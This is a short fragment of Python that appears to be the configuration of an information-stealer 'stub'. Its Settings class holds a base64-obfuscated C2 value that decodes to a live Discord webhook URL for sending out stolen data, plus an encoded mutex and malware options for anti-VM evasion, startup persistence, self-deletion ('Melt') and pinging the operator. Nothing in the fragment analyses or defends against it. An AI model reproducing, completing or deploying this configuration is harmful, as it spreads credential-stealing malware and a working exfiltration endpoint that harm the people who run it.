[Uploading stub.# pip install pyaesm urllib3
...
class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIwODU0ODU4MDExODUwMzUwNS9zU04zLXJudWw1UWhiM2JyMlNoZU9YQzNubUFYZ0J5X2NfWHB5NVVmSmZEcWhaeHB0QzZldTFNTGdsQnl0M2RxOEtZcw==').decode())
    Mutex = base64.b64decode('S1lMMm5kZERTUTFpUElaZA==').decode()
    PingMe = bool('true')
    Vmprotect = bool('true')
    Startup = bool('')
    Melt = bool('true')
